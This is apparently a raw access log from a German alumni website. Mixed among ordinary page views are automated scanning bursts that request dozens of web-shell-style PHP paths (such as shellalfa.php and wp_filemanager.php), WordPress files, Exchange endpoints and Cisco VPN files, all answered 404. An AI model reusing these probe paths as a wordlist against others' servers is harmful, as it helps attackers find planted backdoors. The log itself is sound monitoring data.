277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:45;;/zc-903.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:45;;/cc.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:45;;/nij.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:46;;/info.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:46;;/radio.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:46;;/wp-admin/js/wp-conflg.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:46;;/tox.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:47;;/lo.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:47;;/wpls.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:47;;/geck.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:47;;/inde.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:48;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:48;;/2.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:48;;/zxin.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:49;;/xtt.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:49;;/index/function.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:49;;/noe.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:49;;/class20.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:50;;/shellalfa.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:50;;/te.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:50;;/a2.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:50;;/jp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:51;;/cccc.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:51;;/fe5.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:51;;/sid3.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:51;;/v4.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:52;;/new4.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:52;;/gg.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:52;;/wp-update.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:52;;/gelap.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:53;;/class-t.api.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:53;;/000.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:53;;/wp-content/uploads/index.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:53;;/file18.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:54;;/v.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:54;;/wp-good.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:54;;/acp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:54;;/g.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:55;;/static/sallu.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:55;;/class.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:55;;/simple.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:55;;/ioxi-o.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:56;;/33.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:56;;/wcas.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:56;;/wp-content/uploads/wp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:57;;/f6.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:57;;/v2.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:57;;/file5.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:57;;/lol.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:58;;/fileas.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:58;;/error.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:58;;/wolv2.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:58;;/ava.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:59;;/shell1.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:59;;/gdn.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:59;;/doc.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:52:59;;/autoload_classmap.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:00;;/asd67.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:00;;/12.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:00;;/manager.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:01;;/usep.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:01;;/auth.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:01;;/wp-content/packed.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:01;;/hello.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:02;;/abt.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:02;;/jmfi2.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:02;;/layout.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:02;;/up.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:03;;/flower.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:03;;/nope.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:03;;/js.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:03;;/wp-content/upgrade/index.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:04;;/media.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:04;;/update/f35.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:04;;/default.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:04;;/wp-content/uploads/wp-conflg.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:05;;/wp-load.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:05;;/f35.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:05;;/sko.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:05;;/new.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:06;;/wp-mail.php/wp-includes/ID3/rnEPv9.php;GET;404
79b8c41f40eb2b2ae650358949bd20897ab0cf0185c6e9c161ee1cdf8ec3fd05;2025-11-27 20:53:06;;/;GET;200
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:06;;/png.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:06;;/log.php;GET;404
7c4b5cd45ee551b4ce7aa941116ea3057ba8da31b205a0510881e998245b6a40;2025-11-27 20:53:06;;/apple-touch-icon-120x120-precomposed.png;GET;404
7c4b5cd45ee551b4ce7aa941116ea3057ba8da31b205a0510881e998245b6a40;2025-11-27 20:53:06;;/apple-touch-icon-120x120.png;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:06;;/zwso.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:07;;/about3.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:07;;/fm.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:07;;/r4f_1.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:07;;/ftp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:08;;/content.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:08;;/ext.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:08;;/himu.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:09;;/wfile.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:09;;/pp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:09;;/miansha.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:09;;/test2.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:10;;/wp-admin/maint/index.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:10;;/wp-links-opml.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:10;;/mah.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:11;;/wp-includes/IXR/about.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:11;;/build.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:11;;/atomlib.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:11;;/lib.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:12;;/lv.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:12;;/class-wp.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:12;;/about.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:12;;/filemanager.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:13;;/mail.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:13;;/CLA.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:13;;/ol.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:13;;/ouh.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:14;;/tgrs.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:14;;/system_log.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:14;;/gifclass4.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:14;;/z.php;GET;404
277edf54adab5fa70d281199fea61140a47cc4df56705817840f201ffe467b25;2025-11-27 20:53:15;;/akcc.php;GET;404
cd6591b8b8044234ad2fa6a13018e626a3ae6d34846ae671c3683305a7899761;2025-11-27 20:53:55;;/personen/all/5;GET;200
26e892606cd92d684af75b6252a9a3fed4476423e6900ba164a52b3d65f5221c;2025-11-27 20:55:15;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
d4ff2cef103b663d3f6e97dd143561a3b0730da31127f279437e694c8b9f0420;2025-11-27 20:58:03;;/;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-27 20:59:50;/gruppen/hobby/debattieren;/personen/alumni/schule/BW001;GET;200
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-27 21:01:17;/gruppen/hobby/debattieren;/personen/alumni/schule/170690;GET;200
96b04319f791c3da19bc84913f09e678f079914c02c5c58a35aa80df27ca79c4;2025-11-27 21:05:49;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
d1a037395fa7e788967aa009a3e2e503a6cbcd5cbaa351d7fa39eaf13f777d1e;2025-11-27 21:15:12;;/themen/details/uni-zwischen-ebbe-und-flut;GET;200
6c837b717bd565de354a48ecad79375ad9b432da0100048aedafae240f7b534a;2025-11-27 21:16:34;;/personen/alumni/schule/170574;GET;200
03e05bdf191391f0b90afd20c6faa851198eb5c18198fc380c5c7d6734e3a3c7;2025-11-27 21:19:01;/;/;GET;200
1cfc3f4362334ce9b82b2000bc3b6628c180acf6e1e728f253edcd935f1bb49b;2025-11-27 21:19:10;;/wp-content/plugins/hellopress/wp_filemanager.php;GET;404
ebf07fbebbaf6b18ab7315bd48406b44ebb680ff7b450ac2384d3d10ba97d3cb;2025-11-27 21:19:55;/themen/details/david-gegen-goliath;/themen?category=politik;GET;200
0d1a4054069ff0e8aa746679e3386188d2f85378cd6b9bd8f60c3e9f344c4a48;2025-11-27 21:20:55;;/;GET;200
58793c04edece1a2483d855ba64b42cbc306f3e127c9b2671494f763b1be6f34;2025-11-27 21:21:02;;/;GET;200
436c14d5c21c229d06944e0f62307e7a3327fe5ce131091d794778f349faa66e;2025-11-27 21:24:04;;/personen/alumni/schule/4240545;GET;200
e748fb691ef70f0d5239c24ac7599b288afc79a292862f6bba34987ea8a1b6f7;2025-11-27 21:34:15;;/;GET;200
f24d1909caea35c97685618b89a62a5847bffca73091a5173f5c01f6efaee5f1;2025-11-27 21:34:58;;/personen/alumni/schule/SHH001;GET;200
a9cb680fe1871cff1381b695fe87620bddee29fa8df567a2b2fde94a6912cfe5;2025-11-27 21:35:55;;/themen/details/david-gegen-goliath;GET;200
bdabd14ddad1f03c2b7b3b9c1371d6dd676a3536c2618811ff9d9b9a803ab269;2025-11-27 21:36:05;;/;GET;200
55a38f2eb1e7af7da6c19cdbb7c50a198e5a4dc11781e88fe8663646b3bad146;2025-11-27 21:41:33;/;/;GET;200
456250f9d41a64a2fa0ddb54db4ff4d9e06096219424657e9cf3eee786e49b30;2025-11-27 21:44:23;;/personen/alumni/schule/5505;GET;200
3e41376fafd9aaf8e381436a87ec5185e5975e5843325aca0ea0f210e4b30218;2025-11-27 21:48:22;;/themen/details/der-start-ins-studium;GET;200
76d94f697b816613caac852f8ffb55b787af303bd0fa77300bacb92d7ff8d245;2025-11-27 21:54:36;;/personen/alumni/schule/5508;GET;200
208dd17bf4b83e195335bd7d827312ad4212b5acd0fbb6cb691e1614a3261e4f;2025-11-27 21:56:27;;/themen/details/wenn-sicherheit-sichtbar-wird;GET;200
344b78f04664b06009d09d6b2095627ffca28a2df667a467875a5dd36fd4711b;2025-11-27 21:57:29;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
47a1835d4389c6ae55ef3e1dd7c285654545391a13bfb9963900795b224dc068;2025-11-27 21:58:01;;/;GET;200
cb72eb0418ace7654c405e92adb4499de145cca21b9ee066584a01bf159be363;2025-11-27 22:06:23;;/aktuelles/meldungen/details/start-der-open-beta-jetzt-anmelden-und-testen;GET;200
1061b36db07dd16a7d9dc082f247fccfc26f5cb13d332fac2cf1aeeb91823c04;2025-11-27 22:06:30;;/personen/alumni/schule/9009;GET;200
d5670d78b63e2a7a2d951e788da2dcc062bdbe02b9006518e14ad45a9eb1890d;2025-11-27 22:08:25;;/;GET;200
592802d4d60c2eb7687cd5eccdef38bb9c633791ebeb330c9437c5603c700800;2025-11-27 22:15:00;;/personen/alumni/schule/188001;GET;200
1a65a19379ea25b8f2ae359ec72fb02478e4fb76662dfce5e9bb58609ee8e765;2025-11-27 22:17:05;;/aktuelles/stellenangebote;GET;200
835155c06532cfef9b2cf8ad8a04331fd8928d99efa9518b573350a77844b019;2025-11-27 22:18:42;;/;GET;200
835155c06532cfef9b2cf8ad8a04331fd8928d99efa9518b573350a77844b019;2025-11-27 22:18:42;;/;GET;200
8a9f6039412b035664886cf47263fca73a4ab66530e8325ccae2158a82d42984;2025-11-27 22:21:11;;/gruppen;GET;200
a6790d60a003bdf978c75ccd8f0146fc7dac5aa6b3d26d94936e34a6f5d88083;2025-11-27 22:26:19;;/personen/alumni/schule/59013;GET;200
b685dccece193a5885af57af9b8c086dbb21e2487fce445f34419bc44f2c595f;2025-11-27 22:28:40;;/themen/details/abschied-aus-moabit;GET;200
d2717448edf1979c5e58339472fd4a0e4279bfcef382ed91571aba937d70fce7;2025-11-27 22:32:16;;/;GET;200
47a1835d4389c6ae55ef3e1dd7c285654545391a13bfb9963900795b224dc068;2025-11-27 22:36:13;;/;GET;200
465639ca5ffd2ea9272ca6c37f265507045fb6faaa60a8bea8e0042768c95ae5;2025-11-27 22:36:28;;/personen/alumni/schule/4440012;GET;200
a9e116d30cd5ccf5500fce256fa8cfe4cc5b5d589cd5e2a39b50ebbbbec16ae8;2025-11-27 22:37:00;;/personen;GET;200
b19cecf1e2a0f2fd026857cf749cfd46b4b0c906ad910d9e398475838252608e;2025-11-27 22:37:38;;/owa/;GET;404
b19cecf1e2a0f2fd026857cf749cfd46b4b0c906ad910d9e398475838252608e;2025-11-27 22:37:39;;/EWS/Exchange.asmx;GET;404
b19cecf1e2a0f2fd026857cf749cfd46b4b0c906ad910d9e398475838252608e;2025-11-27 22:37:40;;/Microsoft-Server-ActiveSync;GET;404
e92e3c41bc53a71fdf6c381dd9e34230ee4ae4bdd95630f505847ba8851c40c5;2025-11-27 22:38:18;;/;GET;200
676f4e3778d8aa618d53760e6de22401557d98586989dc4d37192f1d6daf4663;2025-11-27 22:40:43;;/themen/details/abschied-aus-moabit;GET;200
d01ea121f4060f35c56194aeec16c2b2a9a54f72bc7bd69d7075d30bb6b76e84;2025-11-27 22:40:59;;/personen/alumni/schule/65262;GET;200
6c339520a1aba428a6c5de612428f9919ae0ff1958bbb3174c0befbd65314a27;2025-11-27 22:44:03;;/personen/alumni/schule/4240628;GET;200
12276bd578982ee19df0c645d090adffe8d026974f206b3050ff28ce41b8ea23;2025-11-27 22:44:11;;/;GET;200
8b19db178574425bee6ecd701bc3536005ac74cdd8e19a1d95fd5c5ad3a8ef41;2025-11-27 22:44:15;;/;GET;200
d36b518e7458cb1969f655a8de65c706c402ee41ca36093c30ac8bf4e11f42fe;2025-11-27 22:52:19;;/;GET;200
22ba62582430a6d33cc3675e5075cc121d5def323956fbcc91154d276415732b;2025-11-27 22:54:05;;/;GET;200
d2717448edf1979c5e58339472fd4a0e4279bfcef382ed91571aba937d70fce7;2025-11-27 22:56:21;;/;GET;200
3bf2a869efcb1cf4c98534439179dfff29fc701836239143ea94d387546f9d9b;2025-11-27 22:58:31;;/aktuelles/meldungen/details/alumni-portal-des-zbw-geht-an-den-start;GET;200
fcfa6954b25de23e86b96ea917467ccd47b377e216e1424b0b061d721c241d34;2025-11-27 23:02:40;;/login;GET;200
757b4160b9b83e8b3563f6a6c8329c3cd5287266fdd0ab9da23effcbf2db8034;2025-11-27 23:03:22;;/personen;GET;200
19f34f669cdd0033880345023c42fe3ed4775cbcc1b2a15146122167c39f44c4;2025-11-27 23:05:14;;/aktuelles/meldungen?category=community;GET;200
71d0ae922227ab7495d05a158951bf17fb9594ee71fdadffbfc5d61fcde7251c;2025-11-27 23:08:29;;/personen/alumni/schule/03A04;GET;200
bbdd67f67647ee1d7a290d3e988d352a45013556fbc309280fc757393da60b4b;2025-11-27 23:13:50;;/;GET;200
dbf81d61e5ef70d0ecc023d14e7f10afa34bac8543bff34aecbcb77fc06a3c66;2025-11-27 23:14:38;;/personen/alumni/schule/4440541;GET;200
661dac6a4ac7e5ebc5b33b6e08cda07fba1cd462d558c9d7c0a7261669826dc7;2025-11-27 23:19:10;;/;GET;200
7bfd32840b0ca0a6d0d22a526d52698322952ff251748b73c88592340b838cd8;2025-11-27 23:25:02;;/;GET;200
6240a1d075446a9bace05a3000772ef6d97686d240255bf6fc49384fe1c73ea4;2025-11-27 23:25:19;;/personen/alumni/schule/40745;GET;200
6604894891341a817bba4f83a2a03a7a2392aa82f03ef75dac1ace58cd1dcdf0;2025-11-27 23:25:35;/;/;GET;200
bf0eb3daff5a5ac0a9759e8a68829cab5d81068340e4ca040bb6ff2562832898;2025-11-27 23:28:42;;/+CSCOL+/Java.jar;GET;404
bf0eb3daff5a5ac0a9759e8a68829cab5d81068340e4ca040bb6ff2562832898;2025-11-27 23:28:44;;/+CSCOE+/logon_forms.js;GET;404
bf0eb3daff5a5ac0a9759e8a68829cab5d81068340e4ca040bb6ff2562832898;2025-11-27 23:28:45;;/+CSCOL+/a1.jar;GET;404
bf0eb3daff5a5ac0a9759e8a68829cab5d81068340e4ca040bb6ff2562832898;2025-11-27 23:28:47;;/+CSCOE+/transfer.js;GET;404
f7935a091cef300ed7866fb32936d10f677698882d33f3895caebd9d30532748;2025-11-27 23:35:56;;/personen/alumni/schule/MP004;GET;200
669c2d69a2aee255d3b6518ef9cd2617cf0ae59acf234a33d83314693952a9a1;2025-11-27 23:37:02;;/;GET;200
c2e1ad768db98e7125483949f1f0f663fb2487a86d8d65647291331e16fa76af;2025-11-27 23:39:58;;/;GET;200
b65004e96ff6287bb40899d94d558d9f6a7b9d699b80b912513a3b7448d2c695;2025-11-27 23:42:10;;/themen?category=politik;GET;200
d9d85df976f4282e5a1ac648f2bf3bfcc97e5a8079b91ad841fba6818c4ae542;2025-11-27 23:44:30;;/;GET;200
6c837b717bd565de354a48ecad79375ad9b432da0100048aedafae240f7b534a;2025-11-27 23:45:34;;/personen/alumni/schule/68470;GET;200
da01c7094f831cb5d2fc0b5b7aa293bfee341b38c2205dc15d0408632232c74a;2025-11-27 23:54:46;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
6e9d2d27fea8b55dfbbfbe667998ad49bc47ccc659ee6650215704351cb8d641;2025-11-28 00:06:26;;/personen/alumni/schule/170720;GET;200
c6f815cf1e24e7ddcf8d6056d055713d865fe1a6293f635144731c9dfc09f9e5;2025-11-28 00:14:27;/gruppen/hobby/debattieren;/personen/alumni/schule/5502;GET;200
34be5d1c3386e133cbdf5010f50837ef98e40d1c16ede4503a0613ebc942e40f;2025-11-28 00:14:36;;/personen/alumni/schule/59000;GET;200
ae5e81ee4212a107646abb5d20b53f72235fb1a2447ee1653ed5285fe5dab4b5;2025-11-28 00:21:28;;/;GET;200
4a5e4cc420720eba27822a113549d8845ef9eca5b04a1d0a578ff713ffae10f7;2025-11-28 00:24:37;/themen/details/wenn-sicherheit-sichtbar-wird;/themen?category=wissenschaft;GET;200
adb290a21a958e13e56aa29d549d28f83b68b3c11cc24ec2f3d48bf5f9657b0e;2025-11-28 00:30:47;;/gruppen;GET;200
d0a0e926dbd1bebe304e465cb407ed6babfe146cc50357b0c3dfe75f8fa93b8a;2025-11-28 00:35:37;;/personen/alumni/schule/4540118;GET;200
56c8839cb1458ec6d616de798f8d52d9b3700cfb2382a4739638983db25255c4;2025-11-28 00:51:30;;/aktuelles/meldungen/details/hackerangriff-lauft-ins-leere;GET;200
7279043112c60c616787e6b833bd2eeae0bfe0bdb0e4c5b82bdf63bfaca2dd4a;2025-11-28 00:52:03;;/veranstaltungen/details/sommerfest-am-treptow-kolleg;GET;200
f782d6ecbea2e1a8cd9575b7cc4324748248c1f7a222d74c0ae3570f0c507286;2025-11-28 00:53:28;/;/;GET;200
02e2f1393eb797f954fde586da58e8b3b44e5dbdecaba0160b1020eba89f1e91;2025-11-28 00:54:01;/?XDEBUG_SESSION_START=phpstorm;/?XDEBUG_SESSION_START=phpstorm;GET;200
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:19;;/;GET;200
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:20;;//wp-includes/wlwmanifest.xml;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:21;;//xmlrpc.php?rsd;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:21;;/;GET;200
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:21;;//blog/wp-includes/wlwmanifest.xml;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:21;;//web/wp-includes/wlwmanifest.xml;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:22;;//wordpress/wp-includes/wlwmanifest.xml;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:22;;//website/wp-includes/wlwmanifest.xml;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:22;;//wp/wp-includes/wlwmanifest.xml;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:22;;//news/wp-includes/wlwmanifest.xml;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:23;;//2018/wp-includes/wlwmanifest.xml;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:23;;//2019/wp-includes/wlwmanifest.xml;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:23;;//shop/wp-includes/wlwmanifest.xml;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:23;;//wp1/wp-includes/wlwmanifest.xml;GET;404
3de4c5d65a15f2cb1d1bb7c75b5c5683fb0ac613378763e96d6834c0256b1f9e;2025-11-28 00:58:24;;//test/wp-includes/wlwmanifest.xml;GET;404
